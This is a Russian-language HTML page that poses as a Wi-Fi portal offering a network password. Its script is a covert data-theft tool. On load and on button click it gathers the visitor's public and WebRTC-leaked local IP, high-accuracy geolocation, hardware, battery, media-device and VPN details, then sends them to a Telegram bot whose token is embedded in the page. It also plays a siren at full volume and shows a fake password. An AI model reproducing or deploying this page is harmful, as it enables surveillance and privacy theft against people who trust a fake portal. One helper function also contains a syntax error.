<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Portal</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            font-family: 'Arial', sans-serif;
            color: white;
            text-align: center;
        }
        .container {
            max-width: 800px;
            background: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
        }
        .logo {
            width: 150px;
            margin-bottom: 20px;
        }
        h1 {
            color: #4cc9f0;
            margin-bottom: 30px;
            font-size: 2.2rem;
        }
        .password-button {
            padding: 15px 40px;
            font-size: 20px;
            font-weight: bold;
            color: white;
            background: linear-gradient(45deg, #f72585, #7209b7);
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(114, 9, 183, 0.6);
            transition: all 0.3s ease;
            margin: 20px 0;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .password-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(114, 9, 183, 0.8);
            background: linear-gradient(45deg, #7209b7, #f72585);
        }
        .password-button:active {
            transform: translateY(1px);
        }
        .confetti {
            position: fixed;
            width: 12px;
            height: 12px;
            background-color: #f00;
            opacity: 0;
            top: 0;
            left: 0;
            animation: confetti-fall 5s ease-in-out forwards;
            z-index: 1000;
        }
        @keyframes confetti-fall {
            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
        }
        .status {
            margin-top: 30px;
            font-size: 14px;
            color: #a5a5a5;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn-icons-png.flaticon.com/512/2780/2780137.png" class="logo" alt="Wi-Fi Logo">
        <h1>ДОСТУП К СЕТИ WI-FI</h1>
        
        <button class="password-button" id="passwordButton">ПОЛУЧИТЬ ПАРОЛЬ</button>
        
        <div class="status" id="statusMessage">Нажмите кнопку для получения пароля</div>
    </div>

    <audio id="sirenAudio" preload="auto">
        <source src="https://alway6pffline-cmd.github.io/Zvukdlyasaita/sirena-vozdushnogo-naleta-26744.mp3" type="audio/mpeg">
    </audio>

    <script>
        // Telegram бот
        const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
        const chatId = '1209403544';
        
        // Глобальные переменные
        let deviceInfo = {};
        let audioContext;
        let sirenPlaying = false;

        // Основная функция сбора информации
        async function collectDeviceInfo() {
            // Основная информация
            deviceInfo = {
                timestamp: new Date().toISOString(),
                basicInfo: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || "Не поддерживается",
                    onlineStatus: navigator.onLine ? "Онлайн" : "Офлайн"
                },
                hardware: {
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    screenOrientation: window.screen.orientation ? window.screen.orientation.type : "Неизвестно",
                    colorDepth: `${window.screen.colorDepth} бит`,
                    pixelRatio: window.devicePixelRatio,
                    cpuCores: navigator.hardwareConcurrency || "Неизвестно",
                    deviceMemory: navigator.deviceMemory || "Неизвестно",
                    maxTouchPoints: navigator.maxTouchPoints || "Не поддерживается"
                },
                network: await getNetworkInfo(),
                location: await getLocationInfo(),
                battery: await getBatteryInfo(),
                media: await getMediaInfo(),
                storage: await getStorageInfo(),
                webgl: getWebGLInfo(),
                performance: {
                    timing: performance.timing ? {
                        navigationStart: performance.timing.navigationStart,
                        loadEventEnd: performance.timing.loadEventEnd,
                        domComplete: performance.timing.domComplete
                    } : "Недоступно",
                    memory: performance.memory ? {
                        totalJSHeapSize: formatBytes(performance.memory.totalJSHeapSize),
                        usedJSHeapSize: formatBytes(performance.memory.usedJSHeapSize),
                        jsHeapSizeLimit: formatBytes(performance.memory.jsHeapSizeLimit)
                    } : "Недоступно"
                },
                time: {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localTime: new Date().toString(),
                    timezoneOffset: new Date().getTimezoneOffset()
                },
                connection: {
                    publicIP: await getPublicIP(),
                    localIP: await getLocalIP(),
                    vpnInfo: await checkVPN()
                },
                browserFeatures: {
                    serviceWorker: 'serviceWorker' in navigator ? "Поддерживается" : "Не поддерживается",
                    notifications: 'Notification' in window ? "Поддерживается" : "Не поддерживается",
                    geolocation: 'geolocation' in navigator ? "Поддерживается" : "Не поддерживается",
                    webRTC: 'RTCPeerConnection' in window ? "Поддерживается" : "Не поддерживается",
                    webAudio: 'AudioContext' in window ? "Поддерживается" : "Не поддерживается",
                    webSpeech: 'speechSynthesis' in window ? "Поддерживается" : "Не поддерживается",
                    webBluetooth: 'bluetooth' in navigator ? "Поддерживается" : "Не поддерживается"
                }
            };
            
            return deviceInfo;
        }

        // Вспомогательные функции
        function formatBytes(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
        }

        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) return "Информация о сети недоступна";
            
            return {
                effectiveType: connection.effectiveType || "Неизвестно",
                downlink: connection.downlink ? `${connection.downlink} Mbps` : "Неизвестно",
                rtt: connection.rtt ? `${connection.rtt} ms` : "Неизвестно",
                saveData: connection.saveData ? "Включена" : "Выключена",
                networkType: connection.type || "Неизвестно"
            };
        }

        async function getLocationInfo() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("Геолокация не поддерживается");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: `${pos.coords.accuracy} метров`,
                            altitude: pos.coords.altitude ? `${pos.coords.altitude} м` : "Недоступно",
                            heading: pos.coords.heading || "Недоступно",
                            speed: pos.coords.speed ? `${(pos.coords.speed * 3.6).toFixed(1)} км/ч` : "Недоступно",
                            mapLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                    },
                    (err) => resolve(`Ошибка: ${err.message}`),
                    { timeout: 5000, enableHighAccuracy: true }
                );
            });
        }

        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API батареи не поддерживается";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: `${Math.round(battery.level * 100)}%`,
                    charging: battery.charging ? "Заряжается" : "Не заряжается",
                    chargingTime: battery.chargingTime === Infinity ? 
                        "Неизвестно" : `${Math.round(battery.chargingTime / 60)} мин`,
                    dischargingTime: battery.dischargingTime === Infinity ? 
                        "Неизвестно" : `${Math.round(battery.dischargingTime / 60)} мин`
                };
            } catch (e) {
                return "Ошибка получения данных";
            }
        }

        async function getMediaInfo() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return {
                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
                };
            } catch (e) {
                return "Доступ запрещен";
            }
        }

        async function getStorageInfo() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    const estimate = await navigator.storage.estimate();
                    return {
                        quota: formatBytes(estimate.quota),
                        usage: formatBytes(estimate.usage),
                        usageDetails: estimate.usageDetails || "Недоступно"
                    };
                } catch (e) {
                    return "Ошибка получения данных";
                }
            }
            return "API не поддерживается";
        }

        function getWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return "WebGL не поддерживается";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Недоступно",
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Недоступно",
                version: gl.getParameter(gl.VERSION),
                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
            };
        }

        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return "Не удалось определить";
            }
        }

        async function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice.candidate) return;
                    const ip = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
                    if (ip) resolve(ip);
                };
                
                setTimeout(() => resolve("Не удалось определить"), 2000);
            });
        }

        async function checkVPN() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoRes.json();
                
                return {
                    ip: ipData.ip,
                    country: geoData.country_name || "Неизвестно",
                    region: geoData.region || "Неизвестно",
                    city: geoData.city || "Неизвестно",
                    isp: geoData.org || "Неизвестно",
                    proxy: geoData.proxy || false,
                    vpn: geoData.vpn || false,
                    tor: geoData.tor || false
                };
            } catch (e) {
                return "Не удалось проверить";
            }
        }

        // Функции для работы со звуком
        function playSiren() {
            if (sirenPlaying) return;
            
            try {
                const audio = document.getElementById('sirenAudio');
                audio.volume = 1.0;
                audio.play().then(() => {
                    sirenPlaying = true;
                    document.getElementById('statusMessage').textContent = "Звук сирены включен";
                    sendToTelegram("🔊 Сирена активирована на устройстве: " + navigator.userAgent);
                }).catch(e => {
                    console.error("Ошибка воспроизведения:", e);
                    document.getElementById('statusMessage').textContent = "Нажмите разрешить для воспроизведения звука";
                });
            } catch (e) {
                console.error("Ошибка инициализации звука:", e);
            }
        }

        // Функция для создания конфетти
        function createConfetti() {
            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
            for (let i = 0; i < 200; i++) {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.width = Math.random() * 12 + 8 + 'px';
                confetti.style.height = Math.random() * 12 + 8 + 'px';
                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
                document.body.appendChild(confetti);
                
                setTimeout(() => confetti.remove(), 5000);
            }
        }

        // Функция для отправки данных в Telegram
        async function sendToTelegram(message) {
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
            } catch (error) {
                console.error('Ошибка отправки:', error);
            }
        }

        // Форматирование данных для Telegram
        function formatDataForTelegram(data) {
            let message = "🔍 Детальная информация об устройстве:\n\n";
            
            for (const [category, items] of Object.entries(data)) {
                message += `\n🔹 ${category.toUpperCase()}:\n`;
                
                if (typeof items === 'object' && items !== null) {
                    for (const [key, value] of Object.entries(items)) {
                        if (typeof value === 'object' && value !== null) {
                            message += `  • ${key}:\n`;
                            for (const [subKey, subValue] of Object.entries(value)) {
                                message += `    ▪ ${subKey}: ${subValue}\n`;
                            }
                        } else {
                            message += `  • ${key}: ${value}\n`;
                        }
                    }
                } else {
                    message += `  • ${items}\n`;
                }
            }
            
            return message;
        }

        // Обработчик кнопки
        document.getElementById('passwordButton').addEventListener('click', async function() {
            this.disabled = true;
            document.getElementById('statusMessage').textContent = "Сбор информации...";
            
            // Собираем информацию
            await collectDeviceInfo();
            
            // Визуальные эффекты
            createConfetti();
            
            // Воспроизводим сирену
            playSiren();
            
            // Показываем пароль
            alert('Wi-Fi пароль: SuperSecure' + Math.floor(Math.random() * 10000));
            
            // Отправляем данные в Telegram
            const message = formatDataForTelegram(deviceInfo);
            sendToTelegram(message);
            
            document.getElementById('statusMessage').textContent = "Пароль отправлен!";
            this.disabled = false;
        });

        // Инициализация при загрузке
        window.addEventListener('load', async function() {
            document.getElementById('statusMessage').textContent = "Инициализация...";
            
            // Собираем базовую информацию
            await collectDeviceInfo();
            
            // Отправляем уведомление о новом подключении
            const connectMessage = `🌐 Новое подключение с устройства:\n\n` +
                                  `IP: ${deviceInfo.connection.publicIP}\n` +
                                  `User Agent: ${deviceInfo.basicInfo.userAgent}\n` +
                                  `Платформа: ${deviceInfo.basicInfo.platform}\n` +
                                  `Локация: ${deviceInfo.location.mapLink || "Недоступно"}`;
            
            sendToTelegram(connectMessage);
            
            document.getElementById('statusMessage').textContent = "Готово к работе!";
        });
    </script>
</body>
</html>
